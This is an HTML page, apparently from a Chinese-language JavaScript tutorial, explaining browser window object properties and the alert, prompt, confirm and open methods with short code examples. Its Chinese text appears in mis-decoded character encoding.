<h4 id="window-devicePixelRatio"><a href="#window-devicePixelRatio" class="headerlink" title="window.devicePixelRatio"></a>window.devicePixelRatio</h4><p><code>window.devicePixelRatio</code>å±æ€§è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œè¡¨ç¤ºä¸€ä¸ª CSS åƒç´ çš„å¤§å°ä¸ä¸€ä¸ªç‰©ç†åƒç´ çš„å¤§å°ä¹‹é—´çš„æ¯”ç‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ª CSS åƒç´ ç”±å¤šå°‘ä¸ªç‰©ç†åƒç´ ç»„æˆã€‚å®ƒå¯ä»¥ç”¨äºåˆ¤æ–­ç”¨æˆ·çš„æ˜¾ç¤ºç¯å¢ƒï¼Œå¦‚æœè¿™ä¸ªæ¯”ç‡è¾ƒå¤§ï¼Œå°±è¡¨ç¤ºç”¨æˆ·æ­£åœ¨ä½¿ç”¨é«˜æ¸…å±å¹•ï¼Œå› æ­¤å¯ä»¥æ˜¾ç¤ºè¾ƒå¤§åƒç´ çš„å›¾ç‰‡ã€‚</p>
<h4 id="ä½ç½®å¤§å°å±æ€§"><a href="#ä½ç½®å¤§å°å±æ€§" class="headerlink" title="ä½ç½®å¤§å°å±æ€§"></a>ä½ç½®å¤§å°å±æ€§</h4><p>ä»¥ä¸‹å±æ€§è¿”å›<code>window</code>å¯¹è±¡çš„ä½ç½®ä¿¡æ¯å’Œå¤§å°ä¿¡æ¯ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰window.screenXï¼Œwindow.screenY</strong></p>
<p><code>window.screenX</code>å’Œ<code>window.screenY</code>å±æ€§ï¼Œè¿”å›æµè§ˆå™¨çª—å£å·¦ä¸Šè§’ç›¸å¯¹äºå½“å‰å±å¹•å·¦ä¸Šè§’çš„æ°´å¹³è·ç¦»å’Œå‚ç›´è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰ window.innerHeightï¼Œwindow.innerWidth</strong></p>
<p><code>window.innerHeight</code>å’Œ<code>window.innerWidth</code>å±æ€§ï¼Œè¿”å›ç½‘é¡µåœ¨å½“å‰çª—å£ä¸­å¯è§éƒ¨åˆ†çš„é«˜åº¦å’Œå®½åº¦ï¼Œå³â€œè§†å£â€ï¼ˆviewportï¼‰çš„å¤§å°ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p>
<p>ç”¨æˆ·æ”¾å¤§ç½‘é¡µçš„æ—¶å€™ï¼ˆæ¯”å¦‚å°†ç½‘é¡µä»100%çš„å¤§å°æ”¾å¤§ä¸º200%ï¼‰ï¼Œè¿™ä¸¤ä¸ªå±æ€§ä¼šå˜å°ã€‚å› ä¸ºè¿™æ—¶ç½‘é¡µçš„åƒç´ å¤§å°ä¸å˜ï¼ˆæ¯”å¦‚å®½åº¦è¿˜æ˜¯960åƒç´ ï¼‰ï¼Œåªæ˜¯æ¯ä¸ªåƒç´ å æ®çš„å±å¹•ç©ºé—´å˜å¤§äº†ï¼Œå› æ­¤å¯è§éƒ¨åˆ†ï¼ˆè§†å£ï¼‰å°±å˜å°äº†ã€‚</p>
<p>æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå±æ€§å€¼åŒ…æ‹¬æ»šåŠ¨æ¡çš„é«˜åº¦å’Œå®½åº¦ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰window.outerHeightï¼Œwindow.outerWidth</strong></p>
<p><code>window.outerHeight</code>å’Œ<code>window.outerWidth</code>å±æ€§è¿”å›æµè§ˆå™¨çª—å£çš„é«˜åº¦å’Œå®½åº¦ï¼ŒåŒ…æ‹¬æµè§ˆå™¨èœå•å’Œè¾¹æ¡†ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p>
<p><strong>ï¼ˆ4ï¼‰window.scrollXï¼Œwindow.scrollY</strong></p>
<p><code>window.scrollX</code>å±æ€§è¿”å›é¡µé¢çš„æ°´å¹³æ»šåŠ¨è·ç¦»ï¼Œ<code>window.scrollY</code>å±æ€§è¿”å›é¡µé¢çš„å‚ç›´æ»šåŠ¨è·ç¦»ï¼Œå•ä½éƒ½ä¸ºåƒç´ ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p>
<p>æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå±æ€§çš„è¿”å›å€¼ä¸æ˜¯æ•´æ•°ï¼Œè€Œæ˜¯åŒç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœé¡µé¢æ²¡æœ‰æ»šåŠ¨ï¼Œå®ƒä»¬çš„å€¼å°±æ˜¯<code>0</code>ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœç”¨æˆ·å‘ä¸‹æ‹‰åŠ¨äº†å‚ç›´æ»šåŠ¨æ¡75åƒç´ ï¼Œé‚£ä¹ˆ<code>window.scrollY</code>å°±æ˜¯75å·¦å³ã€‚ç”¨æˆ·æ°´å¹³å‘å³æ‹‰åŠ¨æ°´å¹³æ»šåŠ¨æ¡200åƒç´ ï¼Œ<code>window.scrollX</code>å°±æ˜¯200å·¦å³ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.scrollY &lt; 75) &#123;</span><br><span class="line">  window.scroll(0, 75);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœé¡µé¢å‘ä¸‹æ»šåŠ¨çš„è·ç¦»å°äº75åƒç´ ï¼Œé‚£ä¹ˆé¡µé¢å‘ä¸‹æ»šåŠ¨75åƒç´ ã€‚</p>
<p><strong>ï¼ˆ5ï¼‰window.pageXOffsetï¼Œwindow.pageYOffset</strong></p>
<p><code>window.pageXOffset</code>å±æ€§å’Œ<code>window.pageYOffset</code>å±æ€§ï¼Œæ˜¯<code>window.scrollX</code>å’Œ<code>window.scrollY</code>åˆ«åã€‚</p>
<h4 id="ç»„ä»¶å±æ€§"><a href="#ç»„ä»¶å±æ€§" class="headerlink" title="ç»„ä»¶å±æ€§"></a>ç»„ä»¶å±æ€§</h4><p>ç»„ä»¶å±æ€§è¿”å›æµè§ˆå™¨çš„ç»„ä»¶å¯¹è±¡ã€‚è¿™æ ·çš„å±æ€§æœ‰ä¸‹é¢å‡ ä¸ªã€‚</p>
<ul>
<li><code>window.locationbar</code>ï¼šåœ°å€æ å¯¹è±¡</li>
<li><code>window.menubar</code>ï¼šèœå•æ å¯¹è±¡</li>
<li><code>window.scrollbars</code>ï¼šçª—å£çš„æ»šåŠ¨æ¡å¯¹è±¡</li>
<li><code>window.toolbar</code>ï¼šå·¥å…·æ å¯¹è±¡</li>
<li><code>window.statusbar</code>ï¼šçŠ¶æ€æ å¯¹è±¡</li>
<li><code>window.personalbar</code>ï¼šç”¨æˆ·å®‰è£…çš„ä¸ªäººå·¥å…·æ å¯¹è±¡</li>
</ul>
<p>è¿™äº›å¯¹è±¡çš„<code>visible</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¿™äº›ç»„ä»¶æ˜¯å¦å¯è§ã€‚è¿™äº›å±æ€§åªè¯»ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.locationbar.visible</span><br><span class="line">window.menubar.visible</span><br><span class="line">window.scrollbars.visible</span><br><span class="line">window.toolbar.visible</span><br><span class="line">window.statusbar.visible</span><br><span class="line">window.personalbar.visible</span><br></pre></td></tr></table></figure>

<h4 id="å…¨å±€å¯¹è±¡å±æ€§"><a href="#å…¨å±€å¯¹è±¡å±æ€§" class="headerlink" title="å…¨å±€å¯¹è±¡å±æ€§"></a>å…¨å±€å¯¹è±¡å±æ€§</h4><p>å…¨å±€å¯¹è±¡å±æ€§æŒ‡å‘ä¸€äº›æµè§ˆå™¨åŸç”Ÿçš„å…¨å±€å¯¹è±¡ã€‚</p>
<ul>
<li><code>window.document</code>ï¼šæŒ‡å‘<code>document</code>å¯¹è±¡ï¼Œè¯¦è§ã€Šdocument å¯¹è±¡ã€‹ä¸€ç« ã€‚æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§æœ‰åŒæºé™åˆ¶ã€‚åªæœ‰æ¥è‡ªåŒæºçš„è„šæœ¬æ‰èƒ½è¯»å–è¿™ä¸ªå±æ€§ã€‚</li>
<li><code>window.location</code>ï¼šæŒ‡å‘<code>Location</code>å¯¹è±¡ï¼Œç”¨äºè·å–å½“å‰çª—å£çš„ URL ä¿¡æ¯ã€‚å®ƒç­‰åŒäº<code>document.location</code>å±æ€§ï¼Œè¯¦è§ã€ŠLocation å¯¹è±¡ã€‹ä¸€ç« ã€‚</li>
<li><code>window.navigator</code>ï¼šæŒ‡å‘<code>Navigator</code>å¯¹è±¡ï¼Œç”¨äºè·å–ç¯å¢ƒä¿¡æ¯ï¼Œè¯¦è§ã€ŠNavigator å¯¹è±¡ã€‹ä¸€ç« ã€‚</li>
<li><code>window.history</code>ï¼šæŒ‡å‘<code>History</code>å¯¹è±¡ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„æµè§ˆå†å²ï¼Œè¯¦è§ã€ŠHistory å¯¹è±¡ã€‹ä¸€ç« ã€‚</li>
<li><code>window.localStorage</code>ï¼šæŒ‡å‘æœ¬åœ°å‚¨å­˜çš„ localStorage æ•°æ®ï¼Œè¯¦è§ã€ŠStorage æ¥å£ã€‹ä¸€ç« ã€‚</li>
<li><code>window.sessionStorage</code>ï¼šæŒ‡å‘æœ¬åœ°å‚¨å­˜çš„ sessionStorage æ•°æ®ï¼Œè¯¦è§ã€ŠStorage æ¥å£ã€‹ä¸€ç« ã€‚</li>
<li><code>window.console</code>ï¼šæŒ‡å‘<code>console</code>å¯¹è±¡ï¼Œç”¨äºæ“ä½œæ§åˆ¶å°ï¼Œè¯¦è§ã€Šconsole å¯¹è±¡ã€‹ä¸€ç« ã€‚</li>
<li><code>window.screen</code>ï¼šæŒ‡å‘<code>Screen</code>å¯¹è±¡ï¼Œè¡¨ç¤ºå±å¹•ä¿¡æ¯ï¼Œè¯¦è§ã€ŠScreen å¯¹è±¡ã€‹ä¸€ç« ã€‚</li>
</ul>
<h4 id="window-isSecureContext"><a href="#window-isSecureContext" class="headerlink" title="window.isSecureContext"></a>window.isSecureContext</h4><p><code>window.isSecureContext</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºå½“å‰çª—å£æ˜¯å¦å¤„åœ¨åŠ å¯†ç¯å¢ƒã€‚å¦‚æœæ˜¯ HTTPS åè®®ï¼Œå°±æ˜¯<code>true</code>ï¼Œå¦åˆ™å°±æ˜¯<code>false</code>ã€‚</p>
<h3 id="window-å¯¹è±¡çš„æ–¹æ³•"><a href="#window-å¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="window å¯¹è±¡çš„æ–¹æ³•"></a>window å¯¹è±¡çš„æ–¹æ³•</h3><h4 id="window-alert-ï¼Œwindow-prompt-ï¼Œwindow-confirm"><a href="#window-alert-ï¼Œwindow-prompt-ï¼Œwindow-confirm" class="headerlink" title="window.alert()ï¼Œwindow.prompt()ï¼Œwindow.confirm()"></a>window.alert()ï¼Œwindow.prompt()ï¼Œwindow.confirm()</h4><p><code>window.alert()</code>ã€<code>window.prompt()</code>ã€<code>window.confirm()</code>éƒ½æ˜¯æµè§ˆå™¨ä¸ç”¨æˆ·äº’åŠ¨çš„å…¨å±€æ–¹æ³•ã€‚å®ƒä»¬ä¼šå¼¹å‡ºä¸åŒçš„å¯¹è¯æ¡†ï¼Œè¦æ±‚ç”¨æˆ·åšå‡ºå›åº”ã€‚æ³¨æ„ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œéƒ½æ˜¯æµè§ˆå™¨ç»Ÿä¸€è§„å®šçš„å¼æ ·ï¼Œæ— æ³•å®šåˆ¶ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰window.alert()</strong></p>
<p><code>window.alert()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œåªæœ‰ä¸€ä¸ªâ€œç¡®å®šâ€æŒ‰é’®ï¼Œå¾€å¾€ç”¨æ¥é€šçŸ¥ç”¨æˆ·æŸäº›ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.alert(&#39;Hello World&#39;);</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åªæœ‰ç‚¹å‡»â€œç¡®å®šâ€æŒ‰é’®ï¼Œå¯¹è¯æ¡†æ‰ä¼šæ¶ˆå¤±ã€‚å¯¹è¯æ¡†å¼¹å‡ºæœŸé—´ï¼Œæµè§ˆå™¨çª—å£å¤„äºå†»ç»“çŠ¶æ€ï¼Œå¦‚æœä¸ç‚¹â€œç¡®å®šâ€æŒ‰é’®ï¼Œç”¨æˆ·ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ã€‚</p>
<p><code>window.alert()</code>æ–¹æ³•çš„å‚æ•°åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ²¡æ³•ä½¿ç”¨ CSS æ ·å¼ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>\n</code>æŒ‡å®šæ¢è¡Œã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&#39;æœ¬æ¡æç¤º\nåˆ†æˆä¸¤è¡Œ&#39;);</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰window.prompt()</strong></p>
<p><code>window.prompt()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œæç¤ºæ–‡å­—çš„ä¸‹æ–¹ï¼Œè¿˜æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶æœ‰â€œç¡®å®šâ€å’Œâ€œå–æ¶ˆâ€ä¸¤ä¸ªæŒ‰é’®ã€‚å®ƒå¾€å¾€ç”¨æ¥è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; prompt(&#39;æ‚¨çš„å¹´é¾„ï¼Ÿ&#39;, 25)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæ–‡å­—æç¤ºä¸ºâ€œæ‚¨çš„å¹´é¾„ï¼Ÿâ€ï¼Œè¦æ±‚ç”¨æˆ·åœ¨å¯¹è¯æ¡†ä¸­è¾“å…¥è‡ªå·±çš„å¹´é¾„ï¼ˆé»˜è®¤æ˜¾ç¤º25ï¼‰ã€‚ç”¨æˆ·å¡«å…¥çš„å€¼ï¼Œä¼šä½œä¸ºè¿”å›å€¼å­˜å…¥å˜é‡<code>result</code>ã€‚</p>
<p><code>window.prompt()</code>çš„è¿”å›å€¼æœ‰ä¸¤ç§æƒ…å†µï¼Œå¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼ˆæœ‰å¯èƒ½æ˜¯ç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯<code>null</code>ã€‚å…·ä½“åˆ†æˆä¸‰ç§æƒ…å†µã€‚</p>
<ol>
<li>ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶ç‚¹å‡»â€œç¡®å®šâ€ï¼Œåˆ™ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯å°±æ˜¯è¿”å›å€¼ã€‚</li>
<li>ç”¨æˆ·æ²¡æœ‰è¾“å…¥ä¿¡æ¯ï¼Œç›´æ¥ç‚¹å‡»â€œç¡®å®šâ€ï¼Œåˆ™è¾“å…¥æ¡†çš„é»˜è®¤å€¼å°±æ˜¯è¿”å›å€¼ã€‚</li>
<li>ç”¨æˆ·ç‚¹å‡»äº†â€œå–æ¶ˆâ€ï¼ˆæˆ–è€…æŒ‰äº† ESC æŒ‰é’®ï¼‰ï¼Œåˆ™è¿”å›å€¼æ˜¯<code>null</code>ã€‚</li>
</ol>
<p><code>window.prompt()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æœ€å¥½æ€»æ˜¯æä¾›ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œä¸ºè¾“å…¥æ¡†çš„é»˜è®¤å€¼ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰window.confirm()</strong></p>
<p><code>window.confirm()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œé™¤äº†æç¤ºä¿¡æ¯ä¹‹å¤–ï¼Œåªæœ‰â€œç¡®å®šâ€å’Œâ€œå–æ¶ˆâ€ä¸¤ä¸ªæŒ‰é’®ï¼Œå¾€å¾€ç”¨æ¥å¾è¯¢ç”¨æˆ·æ˜¯å¦åŒæ„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var result &#x3D; confirm(&#39;ä½ æœ€è¿‘å¥½å—ï¼Ÿ&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œä¸Šé¢åªæœ‰ä¸€è¡Œæ–‡å­—â€œä½ æœ€è¿‘å¥½å—ï¼Ÿâ€ï¼Œç”¨æˆ·é€‰æ‹©ç‚¹å‡»â€œç¡®å®šâ€æˆ–â€œå–æ¶ˆâ€ã€‚</p>
<p><code>confirm</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå¦‚æœç”¨æˆ·ç‚¹å‡»â€œç¡®å®šâ€ï¼Œè¿”å›<code>true</code>ï¼›å¦‚æœç”¨æˆ·ç‚¹å‡»â€œå–æ¶ˆâ€ï¼Œåˆ™è¿”å›<code>false</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var okay &#x3D; confirm(&#39;Please confirm this message.&#39;);</span><br><span class="line">if (okay) &#123;</span><br><span class="line">  &#x2F;&#x2F; ç”¨æˆ·æŒ‰ä¸‹â€œç¡®å®šâ€</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; ç”¨æˆ·æŒ‰ä¸‹â€œå–æ¶ˆâ€</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>confirm</code>çš„ä¸€ä¸ªç”¨é€”æ˜¯ï¼Œç”¨æˆ·ç¦»å¼€å½“å‰é¡µé¢æ—¶ï¼Œå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œé—®ç”¨æˆ·æ˜¯å¦çœŸçš„è¦ç¦»å¼€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.onunload &#x3D; function () &#123;</span><br><span class="line">  return window.confirm(&#39;ä½ ç¡®å®šè¦ç¦»å¼€å½“é¢é¡µé¢å—ï¼Ÿ&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½å…·æœ‰å µå¡æ•ˆåº”ï¼Œä¸€æ—¦å¼¹å‡ºå¯¹è¯æ¡†ï¼Œæ•´ä¸ªé¡µé¢å°±æ˜¯æš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·åšå‡ºååº”ã€‚</p>
<h4 id="window-open-window-close-ï¼Œwindow-stop"><a href="#window-open-window-close-ï¼Œwindow-stop" class="headerlink" title="window.open(), window.close()ï¼Œwindow.stop()"></a>window.open(), window.close()ï¼Œwindow.stop()</h4><p><strong>ï¼ˆ1ï¼‰window.open()</strong></p>
<p><code>window.open</code>æ–¹æ³•ç”¨äºæ–°å»ºå¦ä¸€ä¸ªæµè§ˆå™¨çª—å£ï¼Œç±»ä¼¼äºæµè§ˆå™¨èœå•çš„æ–°å»ºçª—å£é€‰é¡¹ã€‚å®ƒä¼šè¿”å›æ–°çª—å£çš„å¼•ç”¨ï¼Œå¦‚æœæ— æ³•æ–°å»ºçª—å£ï¼Œåˆ™è¿”å›<code>null</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open(&#39;somefile.html&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¼šè®©æµè§ˆå™¨å¼¹å‡ºä¸€ä¸ªæ–°å»ºçª—å£ï¼Œç½‘å€æ˜¯å½“å‰åŸŸåä¸‹çš„<code>somefile.html</code>ã€‚</p>
<p><code>open</code>æ–¹æ³•ä¸€å…±å¯ä»¥æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(url, windowName, [windowFeatures])</span><br></pre></td></tr></table></figure>

<ul>
<li><code>url</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çª—å£çš„ç½‘å€ã€‚å¦‚æœçœç•¥ï¼Œé»˜è®¤ç½‘å€å°±æ˜¯<code>about:blank</code>ã€‚</li>
<li><code>windowName</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çª—å£çš„åå­—ã€‚å¦‚æœè¯¥åå­—çš„çª—å£å·²ç»å­˜åœ¨ï¼Œåˆ™å ç”¨è¯¥çª—å£ï¼Œä¸å†æ–°å»ºçª—å£ã€‚å¦‚æœçœç•¥ï¼Œå°±é»˜è®¤ä½¿ç”¨<code>_blank</code>ï¼Œè¡¨ç¤ºæ–°å»ºä¸€ä¸ªæ²¡æœ‰åå­—çš„çª—å£ã€‚å¦å¤–è¿˜æœ‰å‡ ä¸ªé¢„è®¾å€¼ï¼Œ<code>_self</code>è¡¨ç¤ºå½“å‰çª—å£ï¼Œ<code>_top</code>è¡¨ç¤ºé¡¶å±‚çª—å£ï¼Œ<code>_parent</code>è¡¨ç¤ºä¸Šä¸€å±‚çª—å£ã€‚</li>
<li><code>windowFeatures</code>ï¼šå­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸ºé€—å·åˆ†éš”çš„é”®å€¼å¯¹ï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œè¡¨ç¤ºæ–°çª—å£çš„å‚æ•°ï¼Œæ¯”å¦‚æœ‰æ²¡æœ‰æç¤ºæ ã€å·¥å…·æ¡ç­‰ç­‰ã€‚å¦‚æœçœç•¥ï¼Œåˆ™é»˜è®¤æ‰“å¼€ä¸€ä¸ªå®Œæ•´ UI çš„æ–°çª—å£ã€‚å¦‚æœæ–°å»ºçš„æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„çª—å£ï¼Œåˆ™è¯¥å‚æ•°ä¸èµ·ä½œç”¨ï¼Œæµè§ˆå™¨æ²¿ç”¨ä»¥å‰çª—å£çš„å‚æ•°ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open(</span><br><span class="line">  &#39;somepage.html&#39;,</span><br><span class="line">  &#39;DefinitionsWindows&#39;,</span><br><span class="line">  &#39;height&#x3D;200,width&#x3D;200,location&#x3D;no,status&#x3D;yes,resizable&#x3D;yes,scrollbars&#x3D;yes&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œæ‰“å¼€çš„æ–°çª—å£é«˜åº¦å’Œå®½åº¦éƒ½ä¸º200åƒç´ ï¼Œæ²¡æœ‰åœ°å€æ ï¼Œä½†æœ‰çŠ¶æ€æ å’Œæ»šåŠ¨æ¡ï¼Œå…è®¸ç”¨æˆ·è°ƒæ•´å¤§å°ã€‚</p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥è®¾å®šå¦‚ä¸‹å±æ€§ã€‚</p>
<ul>
<li>leftï¼šæ–°çª—å£è·ç¦»å±å¹•æœ€å·¦è¾¹çš„è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚æ³¨æ„ï¼Œæ–°çª—å£å¿…é¡»æ˜¯å¯è§çš„ï¼Œä¸èƒ½è®¾ç½®åœ¨å±å¹•ä»¥å¤–çš„ä½ç½®ã€‚</li>
<li>topï¼šæ–°çª—å£è·ç¦»å±å¹•æœ€é¡¶éƒ¨çš„è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li>
<li>heightï¼šæ–°çª—å£å†…å®¹åŒºåŸŸçš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li>
<li>widthï¼šæ–°çª—å£å†…å®¹åŒºåŸŸçš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li>
<li>outerHeightï¼šæ•´ä¸ªæµè§ˆå™¨çª—å£çš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li>
<li>outerWidthï¼šæ•´ä¸ªæµè§ˆå™¨çª—å£çš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li>
<li>menubarï¼šæ˜¯å¦æ˜¾ç¤ºèœå•æ ã€‚</li>
<li>toolbarï¼šæ˜¯å¦æ˜¾ç¤ºå·¥å…·æ ã€‚</li>
<li>locationï¼šæ˜¯å¦æ˜¾ç¤ºåœ°å€æ ã€‚</li>
<li>personalbarï¼šæ˜¯å¦æ˜¾ç¤ºç”¨æˆ·è‡ªå·±å®‰è£…çš„å·¥å…·æ ã€‚</li>
<li>statusï¼šæ˜¯å¦æ˜¾ç¤ºçŠ¶æ€æ ã€‚</li>
<li>dependentï¼šæ˜¯å¦ä¾èµ–çˆ¶çª—å£ã€‚å¦‚æœä¾èµ–ï¼Œé‚£ä¹ˆçˆ¶çª—å£æœ€å°åŒ–ï¼Œè¯¥çª—å£ä¹Ÿæœ€å°åŒ–ï¼›çˆ¶çª—å£å…³é—­ï¼Œè¯¥çª—å£ä¹Ÿå…³é—­ã€‚</li>
<li>minimizableï¼šæ˜¯å¦æœ‰æœ€å°åŒ–æŒ‰é’®ï¼Œå‰ææ˜¯<code>dialog=yes</code>ã€‚</li>
<li>noopenerï¼šæ–°çª—å£å°†ä¸çˆ¶çª—å£åˆ‡æ–­è”ç³»ï¼Œå³æ–°çª—å£çš„<code>window.opener</code>å±æ€§è¿”å›<code>null</code>ï¼Œçˆ¶çª—å£çš„<code>window.open()</code>æ–¹æ³•ä¹Ÿè¿”å›<code>null</code>ã€‚</li>
<li>resizableï¼šæ–°çª—å£æ˜¯å¦å¯ä»¥è°ƒèŠ‚å¤§å°ã€‚</li>
<li>scrollbarsï¼šæ˜¯å¦å…è®¸æ–°çª—å£å‡ºç°æ»šåŠ¨æ¡ã€‚</li>
<li>dialogï¼šæ–°çª—å£æ ‡é¢˜æ æ˜¯å¦å‡ºç°æœ€å¤§åŒ–ã€æœ€å°åŒ–ã€æ¢å¤åŸå§‹å¤§å°çš„æ§ä»¶ã€‚</li>
<li>titlebarï¼šæ–°çª—å£æ˜¯å¦æ˜¾ç¤ºæ ‡é¢˜æ ã€‚</li>
<li>alwaysRaisedï¼šæ˜¯å¦æ˜¾ç¤ºåœ¨æ‰€æœ‰çª—å£çš„é¡¶éƒ¨ã€‚</li>
<li>alwaysLoweredï¼šæ˜¯å¦æ˜¾ç¤ºåœ¨çˆ¶çª—å£çš„åº•ä¸‹ã€‚</li>
<li>closeï¼šæ–°çª—å£æ˜¯å¦æ˜¾ç¤ºå…³é—­æŒ‰é’®ã€‚</li>
</ul>
